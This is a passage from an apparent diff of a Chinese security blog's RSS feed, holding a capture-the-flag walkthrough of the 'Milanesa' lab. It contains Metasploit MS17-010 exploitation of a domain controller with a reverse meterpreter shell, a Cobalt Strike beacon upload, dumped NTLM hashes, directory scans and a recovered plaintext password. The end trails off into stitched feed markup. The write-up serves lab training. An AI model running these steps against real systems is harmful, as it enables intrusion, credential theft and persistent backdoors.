-[*] NetInfo
-[*] 20.20.20.5
-   [-&gt;] Milanesa1
-   [-&gt;] 30.30.30.5
-   [-&gt;] 10.10.10.5
-   [-&gt;] 20.20.20.5
-   [-&gt;] 192.168.56.112
-[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
-[*] NetInfo
-[*] 20.20.20.3
-   [-&gt;] WIN-SEUNA992K57
-   [-&gt;] 192.168.56.11
-   [-&gt;] 10.10.10.3
-   [-&gt;] 20.20.20.3
-   [-&gt;] 30.30.30.3
-[!] 扫描错误 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
-[*] 网站标题 http://20.20.20.6         状态码:503 长度:326    标题:Service Unavailable
-[*] NetInfo
-[*] 20.20.20.6
-   [-&gt;] WIN-11ULVN883E8
-   [-&gt;] 192.168.56.12
-   [-&gt;] 10.10.10.6
-   [-&gt;] 20.20.20.6
-   [-&gt;] 30.30.30.6
-[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
-[*] NetInfo
-[*] 20.20.20.4
-   [-&gt;] WIN-M5KV71CEGO8
-   [-&gt;] 30.30.30.6
-   [-&gt;] 20.20.20.4
-   [-&gt;] 30.30.30.4
-   [-&gt;] 10.10.10.4
-[!] 扫描错误 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
-[*] 网站标题 https://20.20.20.3        状态码:302 长度:0      标题:无标题 重定向地址: https://20.20.20.3/dashboard/
-[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
-[*] 网站标题 http://20.20.20.3         状态码:302 长度:0      标题:无标题 重定向地址: http://20.20.20.3/dashboard/
-[*] 网站标题 http://20.20.20.5:8080    状态码:200 长度:4755   标题:Milanesas Argentinas
-[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
-[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
-[*] 网站标题 http://20.20.20.1:7890    状态码:400 长度:0      标题:无标题
-[*] 网站标题 http://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
-[!] 扫描错误 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
-[*] 网站标题 https://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
-[!] 扫描错误 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
-[!] 扫描错误 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
-[!] 扫描错误 20.20.20.7:22 - 扫描总时间超时: context deadline exceeded
-[+] 扫描已完成: 25/25
-[*] 扫描结束,耗时: 12.122585738s
-
-
-<br>整理一下<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
-20.20.20.4  WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
-20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
-20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
- 
- 域名 hackme.thl
- DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
-<br><br>fscan扫描出域控主机 存在ms17-010<br>
-先配置hosts<br>msfconsole
-msf6 &gt; use exploit/windows/smb/ms17_010_psexec
-[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
-
-Module options (exploit/windows/smb/ms17_010_psexec):
-
-   Name                  Current Setting              Required  Description
-   ----                  ---------------              --------  -----------
-   DBGTRACE              false                        yes       Show extra debug trace info
-   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
-   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
-                                                                lank for auto)
-   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
-                         work/data/wordlists/named_p
-                         ipes.txt
-   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
-                                                                t.com/docs/using-metasploit/basics/using-metas
-                                                                ploit.html
-   RPORT                 445                          yes       The Target port (TCP)
-   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
-                                                                retty listing
-   SERVICE_DISPLAY_NAME                               no        The service display name
-   SERVICE_NAME                                       no        The service name
-   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
-                                                                 (ADMIN$,C$,...) or a normal read/write folder
-                                                                 share
-   SMBDomain             .                            no        The Windows domain to use for authentication
-   SMBPass                                            no        The password for the specified username
-   SMBUser                                            no        The username to authenticate as
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
-lhost =&gt; 20.20.20.7
-msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
-rhosts =&gt; 20.20.20.4
-msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
-
-[*] Started reverse TCP handler on 20.20.20.7:4444
-[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
-[*] 20.20.20.4:445 - Built a write-what-where primitive...
-[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
-[*] 20.20.20.4:445 - Selecting PowerShell target
-[*] 20.20.20.4:445 - Executing the payload...
-[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
-[*] Sending stage (176198 bytes) to 20.20.20.4
-[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500
-
-meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM
-meterpreter &gt; shell
-Process 1592 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt;whoami
-whoami
-nt authority\system
-
-
-c:\Users\Administrator\Documents&gt;type root_flag.txt
-type root_flag.txt
-{5de4808fa7cec46234dbccc6c46fa6c84}
-
-<br>拿下，这里我们传一个cs的后面并运行。方便后续利用<br>meterpreter &gt; upload 3333.exe
-[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
-[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
-[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
-meterpreter &gt; shell
-Process 1596 created.
-Channel 2 created.
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-C:\Windows\system32&gt;3333.exe
-3333.exe
-
-<br><img alt="assets/Pasted image 20241221135649.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"><br><br>利用CS模块查看一下域内的主机<br>[12/21 14:01:39] [+] =========== 查询域主机 ==========
-[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
-[12/21 14:01:39] [+] host called home, sent: 47 bytes
-[12/21 14:01:39] [+] received output:
-"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
-"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"
-
-<br>可以发现除了DC WIN-M5KV71CEGO8 外 还有一台主机 WIN-SEUNA992K57 也在域内<br>
-WIN-SEUNA992K57对应的ip是 20.20.20.3 <br>尝试使用域控的hash直接连接 这台主机<br><br>[12/21 14:05:00] beacon&gt; hashdump
-[12/21 14:05:00] [*] Tasked beacon to dump hashes
-[12/21 14:05:00] [+] host called home, sent: 82541 bytes
-[12/21 14:05:01] [+] received password hashes:
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
-jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
-tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
-WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
-WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
-<br>然后尝试使用域控的HASH 直接pth 但是发现不行<br><br>先看下现在的信息<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
-20.20.20.4 【已拿下】 WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
-20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
-20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
- 
- 域名 hackme.thl
- DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
-<br>我们发现另外3个主机都开放了网页服务。<br>
-对这几个都进行一下目录扫描<br><br>┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
-└─# dirsearch -u http://20.20.20.3
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt
-
-Target: http://20.20.20.3/
-
-[01:55:52] Starting:
-
-[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
-[01:56:01] 200 -    5KB - /dashboard/
-[01:56:01] 200 -   31KB - /dashboard/faq.html
-[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
-[01:56:01] 200 -    6KB - /dashboard/howto.html
-[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
-[01:56:02] 200 -   30KB - /favicon.ico
-[01:56:13] 200 -  776B  - /Webalizer/
-[01:56:14] 200 -  768B  - /xampp/
-
-
-┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
-└─# dirsearch -u http://20.20.20.5:8080
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt
-
-Target: http://20.20.20.5:8080/
-
-[01:56:22] Starting:
-
-[01:56:36] 200 -    1KB - /login.aspx
-
-
-┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
-└─# dirsearch -u http://20.20.20.6
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt
-
-Target: http://20.20.20.6/
-
-[01:57:34] Starting:
-
-Task Completed
-
-
-<br><br>发现 20.20.20.5:8080 存在一个 /login.aspx<br>
-随便输入账号密码发现都可以登录，而且登录后都是一个报错界面<br>
-<img alt="assets/Pasted image 20241221150209.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150209.png"><br>
-这可能就不是一个真的登录框<br>
-将报错信息发给gpt 告诉我 指定的文件路径或命令没有找到<br>
-<img alt="assets/Pasted image 20241221150320.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150320.png"><br>
-经过尝试后 发现这里是一个命令执行的利用<br>
-<img alt="assets/Pasted image 20241221150514.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150514.png"><br>然后在网站的日志里面可以获取到用户的密码<br>
-<img alt="assets/Pasted image 20241221152138.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152138.png"><br>
-/login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
-登录后需要重置密码 因为密码过期了<br>Warning
-这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
-<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
+<br>600]]></description><link>https://www.c1trus.top/24-渗透/thl/9.binary-trail.html</link><guid isPermaLink="false">24-渗透/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
